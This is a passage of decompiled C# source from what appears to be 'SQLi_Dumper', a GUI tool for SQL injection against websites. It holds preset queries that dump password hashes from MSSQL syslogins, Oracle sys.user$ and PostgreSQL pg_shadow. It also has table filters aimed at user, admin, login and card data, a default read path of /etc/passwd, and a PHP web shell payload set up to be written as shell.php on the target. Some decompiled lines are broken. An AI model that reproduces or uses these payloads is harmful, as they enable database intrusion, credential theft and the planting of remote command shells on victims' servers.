					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    [name]");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				if (flag3)
				{
					toolStripMenuItem = new ToolStripMenuItem("SYS");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  all_tables");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    owner");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  all_tab_columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				if (flag4)
				{
					toolStripMenuItem = new ToolStripMenuItem("pg_database");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  datname");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  tables");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  table_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  table_catalog");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				goto IL_075A;
			case 1:
				if (flag)
				{
					toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    column_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				if (flag2)
				{
					toolStripMenuItem = new ToolStripMenuItem("master");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  syscolumns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    [name]");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				if (flag3)
				{
					toolStripMenuItem = new ToolStripMenuItem("SYS");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  all_tab_columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    column_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    owner");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				if (flag4)
				{
					toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    column_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_catalog");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				goto IL_075A;
			case 2:
				toolStripMenuItem = new ToolStripMenuItem(this.trwSchema.SelectedNode.Parent.Text);
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				try
				{
					foreach (object obj in this.trwSchema.SelectedNode.Parent.Nodes)
					{
						TreeNode treeNode = (TreeNode)obj;
						toolStripMenuItem = new ToolStripMenuItem("  " + treeNode.Text);
						list.Add(toolStripMenuItem);
					}
					goto IL_075A;
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				break;
			case 3:
				break;
			default:
				goto IL_075A;
			}
			toolStripMenuItem = new ToolStripMenuItem(this.trwSchema.SelectedNode.Parent.Parent.Text);
			list.Add(toolStripMenuItem);
			toolStripMenuItem.Enabled = false;
			try
			{
				foreach (object obj2 in this.trwSchema.SelectedNode.Parent.Parent.Nodes)
				{
					TreeNode treeNode2 = (TreeNode)obj2;
					toolStripMenuItem = new ToolStripMenuItem("  " + treeNode2.Text);
					list.Add(toolStripMenuItem);
				}
			}
			finally
			{
				IEnumerator enumerator2;
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
		}
		IL_075A:
		try
		{
			foreach (ToolStripMenuItem toolStripMenuItem in list)
			{
				toolStripMenuItem.Click += this.method_125;
			}
		}
		finally
		{
			List<ToolStripMenuItem>.Enumerator enumerator3;
			((IDisposable)enumerator3).Dispose();
		}
		this.ctmSchema.Items.Clear();
		this.ctmSchema.Items.AddRange(list.ToArray());
	}

	// Token: 0x060006E4 RID: 1764 RVA: 0x00030864 File Offset: 0x0002EA64
	private void method_119(object sender, EventArgs e)
	{
		global::Globals.LockWindowUpdate(this.splSchema.Handle);
		this.txtSchemaWhere.Enabled = this.chkDumpWhere.Checked;
		this.txtSchemaOrderBy.Enabled = this.chkDumpOrderBy.Checked;
		this.tsConvert1.Visible = this.chkDumpWhere.Checked | this.chkDumpOrderBy.Checked;
		this.splSchema.Panel2Collapsed = !this.chkDumpWhere.Checked & !this.chkDumpOrderBy.Checked;
		this.splWhere.Panel1Collapsed = !this.chkDumpWhere.Checked;
		this.splWhere.Panel2Collapsed = !this.chkDumpOrderBy.Checked;
		if (!(this.splWhere.Panel1Collapsed & this.splWhere.Panel2Collapsed))
		{
			this.splWhere.SplitterDistance = checked((int)Math.Round((double)this.splWhere.Height / 2.0));
		}
		global::Globals.LockWindowUpdate(IntPtr.Zero);
	}

	// Token: 0x060006E5 RID: 1765 RVA: 0x00030978 File Offset: 0x0002EB78
	private void method_120(object sender, EventArgs e)
	{
		bool flag;
		if ((flag = true) == (sender == this.mnuFilters1))
		{
			this.txtSchemaWhere.Text = "schema_name = database()";
		}
		else if (flag == (sender == this.mnuFilters2))
		{
			this.txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%user%");
		}
		else if (flag == (sender == this.mnuFilters5))
		{
			this.txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%admin%");
		}
		else if (flag == (sender == this.mnuFilters6))
		{
			this.txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%login%");
		}
		else if (flag == (sender == this.mnuFilters7))
		{
			this.txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%customer%");
		}
		else if (flag == (sender == this.mnuFilters8))
		{
			this.txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%sale%");
		}
		else if (flag == (sender == this.mnuFilters9))
		{
			this.txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%mail%");
		}
		else if (flag == (sender == this.mnuFilters10))
		{
			this.txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%card%");
		}
		else if (flag == (sender == this.mnuFilters3))
		{
			this.txtSchemaWhere.Text = "not column_name is null";
		}
		this.txtSchemaWhere.Focus();
	}

	// Token: 0x060006E6 RID: 1766 RVA: 0x00030B2C File Offset: 0x0002ED2C
	private void method_121(object sender, EventArgs e)
	{
		if (true == (sender == this.btnFiltersClear1))
		{
			this.txtSchemaWhere.Clear();
		}
	}

	// Token: 0x060006E7 RID: 1767 RVA: 0x00030B48 File Offset: 0x0002ED48
	private void method_122(object sender, CancelEventArgs e)
	{
		this.mnuConvLEN.Visible = this.txtSchemaWhere.Focused;
		bool flag;
		if ((flag = true) == Class54.smethod_9(this.types_0) || flag == Class54.smethod_10(this.types_0))
		{
			this.mnuConvLEN.Text = "LENGTH(column)>1";
		}
		else
		{
			this.mnuConvLEN.Text = "LEN(column)>1";
		}
	}

	// Token: 0x060006E8 RID: 1768 RVA: 0x00030BB0 File Offset: 0x0002EDB0
	private void method_123(object sender, EventArgs e)
	{
		int selectionStart = this.txtSchemaWhere.SelectionStart;
		bool flag;
		string text;
		if ((flag = true) == Class54.smethod_9(this.types_0) || flag == Class54.smethod_10(this.types_0))
		{
			text = Class23.smethod_20("%@%");
		}
		else
		{
			text = Class23.smethod_21("%@%", false, "+", "chr");
		}
		this.txtSchemaWhere.Text = this.txtSchemaWhere.Text.Insert(selectionStart, text);
		this.txtSchemaWhere.SelectionStart = checked(selectionStart + text.Length);
		this.txtSchemaWhere.SelectionLength = 0;
		this.txtSchemaWhere.Focus();
	}

	// Token: 0x060006E9 RID: 1769 RVA: 0x00030C60 File Offset: 0x0002EE60
	private void method_124(object sender, EventArgs e)
	{
		try
		{
			string text = "";
			TextBox textBox = null;
			bool flag;
			if ((flag = true) == this.txtSchemaWhere.Focused)
			{
				textBox = this.txtSchemaWhere;
			}
			else if (flag == this.txtSchemaOrderBy.Focused)
			{
				textBox = this.txtSchemaOrderBy;
			}
			else if (flag == this.txtCustomQuery.Focused)
			{
				textBox = this.txtCustomQuery;
			}
			else
			{
				if (flag != this.txtCustomQueryFrom.Focused)
				{
					return;
				}
				textBox = this.txtCustomQueryFrom;
			}
			bool flag2;
			if (textBox.SelectedText.Length > 0)
			{
				text = textBox.SelectedText;
			}
			else
			{
				flag2 = true;
			}
			if (flag2 = string.IsNullOrEmpty(text.Trim()))
			{
				using (ImpBox impBox = new ImpBox())
				{
					impBox.Text = global::Globals.translate_0.GetStr(this, 62, "");
					impBox.txtValue.Text = "";
					impBox.ShowDialog(this);
					if (impBox.DialogResult == DialogResult.OK)
					{
						text = impBox.txtValue.Text.Trim();
					}
					else
					{
						text = "";
					}
				}
			}
			if (!string.IsNullOrEmpty(text))
			{
				bool flag3;
				if ((flag3 = true) == (sender == this.mnuConvHex))
				{
					text = Class23.smethod_20(text);
				}
				else if (flag3 == (sender == this.mnuConvChar))
				{
					switch (Class54.smethod_6(this.cmbSqlType.Text))
					{
					case Types.Oracle_No_Error:
					case Types.Oracle_With_Error:
					case Types.PostgreSQL_No_Error:
					case Types.PostgreSQL_With_Error:
						text = Class23.smethod_21(text, false, "||", "chr");
						break;
					default:
						text = Class23.smethod_21(text, false, "+", "char");
						break;
					}
				}
				else if (flag3 == (sender == this.mnuConvCharGroup))
				{
					text = Class23.smethod_21(text, true, "+", "char");
				}
				else if (flag3 == (sender == this.mnuConvLEN))
				{
					if (Class54.smethod_9(this.types_0))
					{
						text = "LENGTH(" + text + ")>1";
					}
					else
					{
						text = "LEN(" + text + ")>1";
					}
				}
				int[] array = new int[2];
				array[0] = textBox.SelectionStart;
				if (!flag2)
				{
					array[1] = textBox.SelectionLength;
					textBox.Text = textBox.Text.Remove(array[0], array[1]);
				}
				textBox.Text = textBox.Text.Insert(array[0], text);
				textBox.SelectionStart = checked(array[0] + text.Length);
				textBox.SelectionLength = 0;
				textBox.Focus();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	// Token: 0x060006EA RID: 1770 RVA: 0x00030F38 File Offset: 0x0002F138
	private void method_125(object sender, EventArgs e)
	{
		try
		{
			bool flag;
			TextBox textBox;
			if ((flag = true) == this.txtSchemaWhere.Focused)
			{
				textBox = this.txtSchemaWhere;
			}
			else
			{
				if (flag != this.txtSchemaOrderBy.Focused)
				{
					return;
				}
				textBox = this.txtSchemaOrderBy;
			}
			string text = Conversions.ToString(textBox.SelectionStart);
			textBox.Text = textBox.Text.Insert(Conversions.ToInteger(text), Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null), null, "Trim", new object[0], null, null, null)));
			textBox.SelectionStart = Conversions.ToInteger(Operators.AddObject(text, NewLateBinding.LateGet(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null), null, "Length", new object[0], null, null, null)));
			textBox.SelectionLength = 0;
			textBox.Focus();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	// Token: 0x060006EB RID: 1771 RVA: 0x0003104C File Offset: 0x0002F24C
	private void method_126(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT TOP 1 CAST(ISNULL([name],CHAR(32)) AS NVARCHAR(4000))\r\nFROM (SELECT DISTINCT TOP [x] [name] FROM [master]..[syslogins] ORDER BY [name] ASC)\r\nsq ORDER BY [name] DESC";
	}

	// Token: 0x060006EC RID: 1772 RVA: 0x00031060 File Offset: 0x0002F260
	private void method_127(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT CAST(ISNULL(is_srvrolemember(0x73797361646d696e),CHAR(32)) AS NVARCHAR(4000))";
	}

	// Token: 0x060006ED RID: 1773 RVA: 0x00031074 File Offset: 0x0002F274
	private void method_128(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT TOP 1 X\r\nFROM (\r\n\tSELECT DISTINCT TOP [x] (D.name+[s]+T.name+[s]+C.name) as X\r\n\tFROM [master]..[sysdatabases] AS D\r\n\tJOIN sysobjects T ON D.dbid = T.uid \r\n\tJOIN syscolumns AS C ON T.id = C.id\r\n\tORDER BY X ASC\r\n)\r\nsq ORDER BY X DESC";
	}

	// Token: 0x060006EE RID: 1774 RVA: 0x00031088 File Offset: 0x0002F288
	private void method_129(object sender, EventArgs e)
	{
		using (new Class8(global::Globals.GMain))
		{
			MessageBox.Show("MS SQL does not support a SQL statement to limiting the rows.\r\nBut we can use the method of ordering 'ORDER BY ASC/DESC'!\r\nTake this example:\r\n\r\nSELECT TOP 1 ([name]+[s]+[password]) As t\r\nFROM [DB]..[TABLE]\r\nWHERE [name] = (\r\n\tSELECT TOP 1 [name] FROM (\r\n\t\tSELECT DISTINCT TOP [x] [name]\r\n\t\tFROM [DB]..[TABLE]\r\n\t\tORDER BY [name] ASC)\r\n\tsq ORDER BY [name] DESC)\r\n\r\nAs this example show, you can use the variables:\r\n\t[x] = for a index limit method, to dump in loops\r\n\t[s] = for a split column used by dump grid\r\nWHEN YOU SEE REPEATED DATA, STOP THE JOB\r\nIt is necessary because the application can not determine how much rows are affected.\r\nAnd with a 'SELECT TOP .. ORDER BY .. ASC/DESC' WILL ALWAYS RETURN DATA!\r\n\r\nIMPORTANT:\r\nYou can't use the ',' to separate the columns\r\nUse the statement 'SELECT (column1+[s]+column2) as t'...", "Query Help", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	// Token: 0x060006EF RID: 1775 RVA: 0x000310D0 File Offset: 0x0002F2D0
	private void method_130(object sender, EventArgs e)
	{
		using (new Class8(global::Globals.GMain))
		{
			MessageBox.Show("You can't use the '+' or '/**/' (use only spaces)\r\nYou do not need to add 'SELECT' and 'FROM' keyword\r\n\r\nTake this example:\r\nSELECT column1, column2\r\nFROM DB.Table\r\nWHERE column1 = hex_or_char\r\nORDER By column1 DESC, column2 ASC\r\nLIMIT [x],[y]\r\n\r\nFor limiting SQL statement, you can use the variables variables [x],[y]", "Query Help", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	// Token: 0x060006F0 RID: 1776 RVA: 0x00031118 File Offset: 0x0002F318
	private void method_131(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT U [s] R\r\nFROM (\r\n\tSELECT ROWNUM R, username AS U\r\n\tFROM all_users\r\n)\r\nWHERE R = [x]";
	}

	// Token: 0x060006F1 RID: 1777 RVA: 0x0003112C File Offset: 0x0002F32C
	private void method_132(object sender, EventArgs e)
	{
		using (new Class8(global::Globals.GMain))
		{
			MessageBox.Show("Oracle does not support a SQL statement to limiting the rows.\r\n\r\nFrom Oracle 9i onwards, the RANK() and DENSE_RANK() functions can be used to determine the TOP N rows. Examples:\r\n\r\nSELECT column1 \r\nFROM (\r\n\tSELECT column1, RANK() OVER (ORDER BY column1 DESC) sal_dense_rank FROM table1\r\n)\r\nWHERE sal_dense_rank  = [x]\r\n(PS: DENSE_RANK() can be used)\r\n\r\nOR\r\n\r\nSELECT column1 \r\nFROM (\r\n\tSELECT ROWNUM R, column1 FROM table1) \r\n)\r\nWHERE R = [x]\r\n\r\nAs this example show, you can use the variables:\r\n\t[x] = for a index limit method, to dump in loops\r\n\t[s] = for a split column used by dump grid\r\n\r\nIMPORTANT:\r\nYou can't use the ',' to separate the columns\r\nUse the statement 'SELECT (column1 [s] column2) as t'...\r\nWHEN YOU SEE REPEATED DATA, STOP THE JOB\r\nIt is necessary because the application can not determine how much rows are affected.", "Query Help", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	// Token: 0x060006F2 RID: 1778 RVA: 0x00031174 File Offset: 0x0002F374
	private void method_133(object sender, EventArgs e)
	{
		if (this.lblVersion.Text.Contains("10"))
		{
			this.txtCustomQuery.Text = "SELECT N\r\nFROM (\r\n\tSELECT ROWNUM R, (name [s] password [s] astatus) AS N\r\n\tFROM sys.user$\r\n)\r\nWHERE R = [x]";
		}
		else
		{
			this.txtCustomQuery.Text = "SELECT N\r\nFROM (\r\n\tSELECT ROWNUM R, (name [s] spare4) AS N\r\n\tFROM sys.user$\r\n)\r\nWHERE R = [x]";
		}
	}

	// Token: 0x060006F3 RID: 1779 RVA: 0x000311B0 File Offset: 0x0002F3B0
	private void method_134(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT U [s] R\r\nFROM (\r\n\tSELECT ROWNUM R, username AS U\r\n\tFROM all_users\r\n)\r\nWHERE R = [x]";
	}

	// Token: 0x060006F4 RID: 1780 RVA: 0x000311C4 File Offset: 0x0002F3C4
	private void method_135(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT usename\r\nFROM pg_user\r\nLIMIT 1 OFFSET [x]";
	}

	// Token: 0x060006F5 RID: 1781 RVA: 0x000311D8 File Offset: 0x0002F3D8
	private void method_136(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT usename [s] passwd\r\nFROM pg_shadow\r\nLIMIT 1 OFFSET [x]";
	}

	// Token: 0x060006F6 RID: 1782 RVA: 0x000311EC File Offset: 0x0002F3EC
	private void method_137(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "SELECT DISTINCT C.relname [s] A.attnum\r\nFROM pg_class C, pg_namespace N, pg_attribute A, pg_type T\r\nWHERE (C.relkind=Chr(114))\r\n\tAND (N.oid=C.relnamespace)\r\n\tAND (A.attrelid=C.oid)\r\n\tAND (A.atttypid=T.oid)\r\n\tAND (A.attnum>0)\r\n\tAND (NOT A.attisdropped) \r\n\tAND (N.nspname LIKE Chr(112)||Chr(117)||Chr(98)||Chr(108)||Chr(105)||Chr(99))\r\nLIMIT 1 OFFSET [x]";
	}

	// Token: 0x060006F7 RID: 1783 RVA: 0x00031200 File Offset: 0x0002F400
	private void method_138(object sender, DoWorkEventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		try
		{
			string text = Class23.smethod_11(Conversions.ToString(e.Argument));
			string text2 = string.Format("http://data.alexa.com/data?cli=10&dat=snbamz&url={0}", text);
			Class51 @class = new Class51(text2, "SQLi_Dumper", ';', 0);
			stringBuilder.AppendLine("Country: ".PadLeft(18, ' ') + @class.method_3("COUNTRY", "CODE", "N/A") + " - " + @class.method_3("COUNTRY", "NAME", "N/A"));
			stringBuilder.AppendLine("Rank: ".PadLeft(18, ' ') + @class.method_3("COUNTRY", "RANK", "N/A"));
			stringBuilder.AppendLine("Reach: ".PadLeft(18, ' ') + @class.method_3("REACH", "RANK", "N/A"));
			stringBuilder.AppendLine("Delta: ".PadLeft(18, ' ') + @class.method_3("RANK", "DELTA", "N/A"));
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("Host: ".PadLeft(18, ' ') + @class.method_3("SD", "HOST", "N/A"));
			stringBuilder.AppendLine("Linked: ".PadLeft(18, ' ') + @class.method_3("LINKSIN", "NUM", "N/A"));
			stringBuilder.AppendLine("Title: ".PadLeft(18, ' ') + @class.method_3("TITLE", "TEXT", "N/A"));
			stringBuilder.AppendLine("Description: ".PadLeft(18, ' ') + @class.method_3("SITE", "DESC", "N/A"));
			stringBuilder.AppendLine("Created: ".PadLeft(18, ' ') + @class.method_3("CREATED", "DATE", "N/A"));
			stringBuilder.AppendLine("ID: ".PadLeft(18, ' ') + @class.method_3("CAT", "ID", "N/A"));
			stringBuilder.AppendLine("City: ".PadLeft(18, ' ') + @class.method_3("ADDR", "CITY", "N/A"));
			stringBuilder.AppendLine("Owner: ".PadLeft(18, ' ') + @class.method_3("OWNER", "NAME", "N/A"));
			stringBuilder.Append("Email: ".PadLeft(18, ' ') + @class.method_3("EMAIL", "ADDR", "N/A"));
			e.Result = stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			e.Result = ex.Message;
		}
	}

	// Token: 0x060006F8 RID: 1784 RVA: 0x00031510 File Offset: 0x0002F710
	private void method_139(object sender, RunWorkerCompletedEventArgs e)
	{
		if (e.Error != null)
		{
			MessageBox.Show(e.Error.Message);
		}
		else if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(e.Result, "\r\n"), "\r\n"), global::Globals.translate_0.GetStr(global::Globals.GMain, 64, ""))), global::Globals.APP_VERSION, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
		{
			global::Globals.ShellUrl("http://www.alexa.com/siteinfo/" + Class23.smethod_11(this.txtURL.Text.Trim()));
		}
	}

	// Token: 0x060006F9 RID: 1785 RVA: 0x000315B0 File Offset: 0x0002F7B0
	private void method_140(object sender, EventArgs e)
	{
		this.numFieldByField.Enabled = this.chkDumpFieldByField.Checked;
		this.numMaxRetryColumn.Enabled = this.chkDumpFieldByField.Checked;
	}

	// Token: 0x060006FA RID: 1786 RVA: 0x000315E0 File Offset: 0x0002F7E0
	private void method_141(object sender, EventArgs e)
	{
		this.txtAddHeaderName.Enabled = this.chkAddHearder.Checked;
		this.txtAddHeaderValue.Enabled = this.chkAddHearder.Checked;
	}

	// Token: 0x060006FB RID: 1787 RVA: 0x00031610 File Offset: 0x0002F810
	private void method_142(object sender, EventArgs e)
	{
		if (this.cmbInjectionPoint.SelectedIndex == checked(this.cmbInjectionPoint.Items.Count - 1))
		{
			this.chkAddHearder.Checked = true;
			this.chkAddHearder.Enabled = false;
		}
		else
		{
			this.chkAddHearder.Enabled = true;
		}
	}

	// Token: 0x060006FC RID: 1788 RVA: 0x00031664 File Offset: 0x0002F864
	private void method_143(object sender, EventArgs e)
	{
		this.method_76();
	}

	// Token: 0x060006FD RID: 1789 RVA: 0x0003166C File Offset: 0x0002F86C
	private void method_144(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.mnuAutoScroll.Text, global::Globals.translate_0.GetStr(global::Globals.GMain, 63, ""), false) == 0)
		{
			this.mnuAutoScroll.Text = global::Globals.translate_0.GetStr(global::Globals.GMain, 62, "");
		}
		else
		{
			this.mnuAutoScroll.Text = global::Globals.translate_0.GetStr(global::Globals.GMain, 63, "");
		}
	}

	// Token: 0x060006FE RID: 1790 RVA: 0x000316EC File Offset: 0x0002F8EC
	private void method_145(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_0002:
			ProjectData.ClearProjectError();
			num = -2;
			IL_000A:
			int num2 = 2;
			if (decimal.Compare(this.numLimitMax.Value, 0m) <= 0)
			{
				goto IL_0040;
			}
			IL_0026:
			num2 = 3;
			this.numLimitX.Maximum = this.numLimitMax.Value;
			goto IL_0058;
			IL_0040:
			num2 = 5;
			this.numLimitX.Maximum = 2147483647m;
			IL_0058:
			goto IL_00CB;
			IL_005A:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_0084:
			goto IL_00C0;
			IL_0086:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_009E:;
		}
		catch when (endfilter((obj is Exception) & (num != 0) & (num4 == 0)))
		{
			Exception ex = (Exception)obj2;
			goto IL_0086;
		}
		IL_00C0:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_00CB:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x060006FF RID: 1791 RVA: 0x000317DC File Offset: 0x0002F9DC
	private void method_146(object sender, EventArgs e)
	{
		this.method_78("AppInstencie.Schema");
		global::Globals.GMain.method_9(this.txtURL.Text, this.cmbSqlType.Text, null);
	}

	// Token: 0x06000700 RID: 1792 RVA: 0x0003180C File Offset: 0x0002FA0C
	private void method_147(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.txtMySQLReadFilePath.Text))
		{
			this.txtMySQLReadFilePath.Text = "/etc/passwd";
		}
	}

	// Token: 0x06000701 RID: 1793 RVA: 0x00031830 File Offset: 0x0002FA30
	private void method_148(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.txtMySQLReadFilePath.Text))
		{
			this.txtMySQLReadFilePath.Text = "'<? system($_REQUEST['cmd']); ?>'";
		}
	}

	// Token: 0x06000702 RID: 1794 RVA: 0x00031854 File Offset: 0x0002FA54
	private void method_149(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.txtMySQLWriteFilePath.Text))
		{
			this.txtMySQLWriteFilePath.Text = "'/home/www/HostName_com/html/shell.php'";
		}
	}

	// Token: 0x06000703 RID: 1795 RVA: 0x00031878 File Offset: 0x0002FA78
	private void method_150(object sender, EventArgs e)
	{
	}

	// Token: 0x06000704 RID: 1796 RVA: 0x0003187C File Offset: 0x0002FA7C
	private void method_151(object sender, TreeNodeMouseClickEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			this.trwSchema.SelectedNode = e.Node;
		}
	}

	// Token: 0x06000705 RID: 1797 RVA: 0x000318A0 File Offset: 0x0002FAA0
	private void method_152(object sender, EventArgs e)
	{
		TextBox textBox = (TextBox)sender;
		textBox.Text = textBox.Text.Trim();
	}

	// Token: 0x06000706 RID: 1798 RVA: 0x000318C8 File Offset: 0x0002FAC8
	private void method_153(object sender, ToolStripItemClickedEventArgs e)
	{
	}

	// Token: 0x06000707 RID: 1799 RVA: 0x000318CC File Offset: 0x0002FACC
	private void method_154(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x06000708 RID: 1800 RVA: 0x000318D0 File Offset: 0x0002FAD0
	private void method_155(object sender, EventArgs e)
	{
		this.numMySQLSplitRowsLenght.Enabled = this.chkMySQLSplitRows.Checked;
		this.numMySQLSplitRows.Enabled = this.chkMySQLSplitRows.Checked;
	}

	// Token: 0x06000709 RID: 1801 RVA: 0x00031900 File Offset: 0x0002FB00
	private void method_156(object sender, EventArgs e)
	{
		this.string_8 = this.txtSearchColumn.Text;
		this.method_0(Dumper.Enum5.const_9);
	}

	// Token: 0x0600070A RID: 1802 RVA: 0x0003191C File Offset: 0x0002FB1C
	private void method_157(object sender, EventArgs e)
	{
		if (this.txtSearchColumn.Text.Contains(" "))
		{
			this.txtSearchColumn.Text = this.txtSearchColumn.Text.Replace(" ", "");
		}
		if (string.IsNullOrEmpty(this.txtSearchColumn.Text))
		{
			this.txtSearchColumn.Text = "mail";
		}
		if (!this.txtSearchColumn.Items.Contains(this.txtSearchColumn.Text))
		{
			this.txtSearchColumn.Items.Add(this.txtSearchColumn.Text);
		}
	}

	// Token: 0x0600070B RID: 1803 RVA: 0x000319C4 File Offset: 0x0002FBC4
	private void method_158(object sender, EventArgs e)
	{
		this.btnSearchColumn.Enabled = !string.IsNullOrEmpty(this.txtSearchColumn.Text);
	}

	// Token: 0x0600070C RID: 1804 RVA: 0x000319E4 File Offset: 0x0002FBE4
	private void method_159(string string_9)
	{
		if (this.txtSearchColumnResult.InvokeRequired)
		{
			this.txtSearchColumnResult.Invoke(new Dumper.Delegate20(this.method_159), new object[] { string_9 });
		}
		else
		{
			this.txtSearchColumnResult.AppendText(string_9 + "\r\n");
		}
	}

	// Token: 0x0600070D RID: 1805 RVA: 0x00031A38 File Offset: 0x0002FC38
	[CompilerGenerated]
	[DebuggerHidden]
	private void dumpLoading_0_OnPause(bool bool_6)
	{
		this.method_6(bool_6);
	}

	// Token: 0x0600070E RID: 1806 RVA: 0x00031A48 File Offset: 0x0002FC48
	[CompilerGenerated]
	[DebuggerHidden]
	private void method_160(object object_0)
	{
		this.method_24((Dumper.Class47)object_0);
	}

	// Token: 0x0600070F RID: 1807 RVA: 0x00031A58 File Offset: 0x0002FC58
	[CompilerGenerated]
	[DebuggerHidden]
	private void method_161(object object_0)
	{
		this.method_22((Dumper.Class47)object_0);
	}

	// Token: 0x06000710 RID: 1808 RVA: 0x00031A68 File Offset: 0x0002FC68
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_162(object object_0)
	{
		this.method_23((Dumper.Class47)object_0);
	}

	// Token: 0x06000711 RID: 1809 RVA: 0x00031A78 File Offset: 0x0002FC78
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_163(object object_0)
	{
		this.method_24((Dumper.Class47)object_0);
	}

	// Token: 0x06000712 RID: 1810 RVA: 0x00031A88 File Offset: 0x0002FC88
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_164(object object_0)
	{
		this.method_25((Dumper.Class47)object_0);
	}

	// Token: 0x06000713 RID: 1811 RVA: 0x00031A98 File Offset: 0x0002FC98
